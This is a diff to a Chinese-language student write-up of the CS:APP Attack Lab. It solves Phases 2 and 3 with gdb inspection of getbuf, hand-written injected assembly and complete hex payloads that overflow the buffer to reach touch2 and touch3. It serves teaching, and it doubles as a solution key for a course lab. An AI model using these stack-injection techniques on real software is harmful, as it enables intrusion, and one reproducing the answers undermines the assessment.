@@ -60,12 +60,14 @@ ROP攻击，全称 **Return-oriented Programming Attack**，即不注入任何�
 ./ctarget -i ans1.txt # 运行ctarget，让它从ans1.txt中读取输入
 ```
 
-在这之外，ROP攻击还多了几步，需要先编辑好想进行攻击的汇编代码，再将其转化为十六进制编码gadget，找出gadget地址，将它编写进十六进制文件。
+在这之外，有的phase还多了几步，需要先编辑好想进行攻击的汇编代码，再将其转化为十六进制编码gadget，找出gadget地址，将它编写进十六进制文件。
 
 以下列代码为例：
 ```
 gcc -c p5.s && objdump -d p5.o > p5.byte # 将p5.s编译并反汇编为p5.byte文件(带十六进制编码的汇编码文件)
 ```
+
+最后，笔者需要提醒的是，无论何时都不要在编写的16进制文件中出现``0x0a``，这会使``get``函数中断输入，从而导致缓冲区代码注入无法成功完成。
 
 ### 正则表达式搜索
 在ROP攻击的三个phase中，找到合适的garget是件大体力活，掌握正则表达式搜索可以使工作效率事半功倍。
@@ -158,3 +160,224 @@ objdump -d ctarget > ctarget.s
 ![](./Picture%20Assets/6.png)
 
 ### Phase 2
+根据``writeup``，需要让``ctarget``文件执行``touch2``的代码，而不是返回``test``。同时，需要将``touch2``传进的参数(存放在``%rdi``中)为``cookie``。
+
+笔者的提醒是，如``writeup``中所言，需要将栈指针对齐到``16字节``，同时不要使用``jmp``或者``call``作为攻击代码。
+
+很显然，这个phase不能简单地使用缓冲区溢出来变换地址，而是应该采用编写汇编代码，再转换为16进制文件的方法来实现。
+
+但是，要怎么利用缓冲区内的代码呢？如果把转换后的16进制码设为溢出码的话，那可能会破坏更深层的结构。
+
+所以，正确的做法是，缓冲区内存攻击代码，而把``getbuf``的返回值设为栈顶指针地址，从而当``getbuf``返回时，切到栈顶接着执行缓冲区代码(由于栈的出栈入栈只是栈指针的变动，若无特殊情况不会影响存放的值)。
+
+也就是如课本3.10.3节所言，"通常，输入给程序一个字符串，这个字符串包含一些可执行代码的字节编码，称为攻击代码。另外，还有一些字节会用一个指向攻击代码的指针覆盖返回地址。那么，执行``ret``指令的效果就是跳转到攻击代码"。
+
+于是，先找出缓冲区的起始点，阅读``getbuf``的代码：
+
+```
+0000000000401caa <getbuf>:
+  401caa:	f3 0f 1e fa          	endbr64
+  401cae:	48 83 ec 28          	sub    $0x28,%rsp # 分配40字节空间
+  401cb2:	48 89 e7             	mov    %rsp,%rdi # 把%rsp赋给%rdi 
+  401cb5:	e8 57 03 00 00       	call   402011 <Gets> # 调用gets
+  401cba:	b8 01 00 00 00       	mov    $0x1,%eax # 将$eax置为1
+  401cbf:	48 83 c4 28          	add    $0x28,%rsp # 释放空间
+  401cc3:	c3                   	ret 
+```
+
+需要在栈指针被更新后，找出它的地址，需要把断点打在``mov %rsp,%rdi``上。
+
+运行以下代码：
+
+```
+gdb ctarget
+b *(getbuf+8) 
+r // 注意这个Lab没有配置./gdbinit文件，需要手动添加
+layout asm
+layout regs
+```
+
+![](./Picture%20Assets/7.png)
+
+即缓冲区的起始地址为``0x55664bd8``。
+
+同时，通过查找得``touch2``的起始地址为``0x401d6a``，同时笔者的``cookie``为``0x23a8da61``，得到以下汇编代码：
+
+```
+movq $0x23a8da61,%rdi
+pushq $0x401d6a
+ret
+```
+
+将它写入``p2.s``中，并运行以下指令：
+
+```
+gcc -c p2.s # 编译
+objdump -d p2.o > p2.byte # 翻译为字节码
+```
+
+得到``p2.byte``：
+
+```
+
+p2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 61 da a8 23 	mov    $0x23a8da61,%rdi
+   7:	68 6a 1d 40 00       	push   $0x401d6a
+   c:	c3                   	ret
+```
+
+也就是，答案应该如下所示：
+
+```
+48 c7 c7 61 da a8 23 68 
+6a 1d 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d8 4b 66 55 
+```
+
+将其写入``p2.txt``，打开终端，运行以下指令：
+
+```
+./hex2raw < p2.txt > ans2.txt
+./ctarget -i ans2.txt
+```
+
+得到以下输出，表示已经完成了``phase 2``：
+
+![](./Picture%20Assets/8.png)
+
+### Phase 3
+根据``writup``，需要让``ctarget``文件执行``touch3``的代码，而不是返回``test``。同时，需要让``touch3``传进的参数是``cookie``的字符串表示。
+
+找一张``ASCIL码``图，将上文所述``cookie``翻译为``32 33 61 38 64 61 36 31``。
+
+``writeup``中给出了``hexmatch``和``touch3``函数的大致结构：
+
+```
+/* Compare string to hex representation of unsigned value */
+int hexmatch(unsigned val, char *sval)
+{
+    char cbuf[110];
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, "%.8x", val);
+    return strncmp(sval, s, 9) == 0;
+}
+
+void touch3(char *sval)
+{
+    vlevel = 3;      /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+```
+
+大概意思就是，将``sval``作为参数传进去后，进入``hexmatch``。这个函数
+- 首先分配一个长度为``110``的字符数组，然后再从其中随机选取一个位置作为``s``。
+- 接着，将传进的``val``，也就是``cookie``，复制起始的八个字节，到``s``的起始位置。
+- 比较``sval``和``val``，若相等则返回真。
+
+由于``touch3``是通过覆盖``getbuf``的返回地址得来的，因此其栈帧和``hexmatch``的栈帧紧接着在缓冲区下方，而猜测当``s``被随机得过大，就有可能覆写原先存在缓冲区的东西。
+
+不过，好消息是，``hexmatch``中分配内存的语句为``add    $0xffffffffffffff80,%rsp``，即``rsp-=128``，而还存在``touch``的栈帧，猜测在原本的缓冲区中，有一些它``无法reach``的东西。
+
+按照phase 2的思路，找出touch3的地址``0x401e90``编写以下代码：
+
+```
+movq $0x23a8da61,%rdi
+pushq $0x401e90
+ret
+```
+
+将它写入``p3.s``中，并运行以下指令：
+
+```
+gcc -c p3.s
+objdump -d p3.o > p3.byte 
+```
+
+将获得的答案写到``p3.txt``中，得到
+
+```
+48 c7 c7 61 da a8 23 68 
+90 1e 40 00 c3 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f // 充位代码换为3f便于观察是否顶掉
+d8 4b 66 55 
+```
+
+然后，运行以下代码，观察缓冲区的变化
+
+```
+./hex2raw < p3.txt > p3a.txt 
+gdb ctarget
+b touch3
+set args -i p3a.txt
+r
+layout asm
+layout regs
+```
+
+在``touch3``处，运行``x/20x 0x55664bd8``，观察到存在缓冲区的值还未被覆写。
+
+![](./Picture%20Assets/9.png)
+
+一直运行``si``命令，发现缓冲区的值被覆写了，符合第一个猜测！
+
+![](./Picture%20Assets/10.png)
+
+再观察这两张图，发现``0x55664c18``处的八个字节似乎没有被覆写，如果真的符合第二个猜测，也许可以尝试把所需命令存在这里，然后将``%rdi``这个指针赋为``0x55664c18``。
+
+重新编写``p3.s``为以下代码：
+
+```
+movq $0x55664c18,%rdi
+pushq $0x401e90
+ret
+```
+
+重新执行上面的步骤，得到``p3.txt``：
+
+```
+48 c7 c7 18 4c 66 55 68 
+90 1e 40 00 c3 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d8 4b 66 55 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+32 33 61 38 64 61 36 31
+```
+
+打开终端，运行以下指令：
+
+```
+./hex2raw < p3.txt > ans3.txt
+./ctarget -i ans3.txt
+```
+
+得到以下输出，表示已经完成了``phase 3``：
+
+![](./Picture%20Assets/11.png)
+
+### Phase 4
+首先，运行下列指令，对``rtarget``进行反汇编，得到其汇编码文件:
+
+```
+objdump -d rtarget > rtarget.s
+```
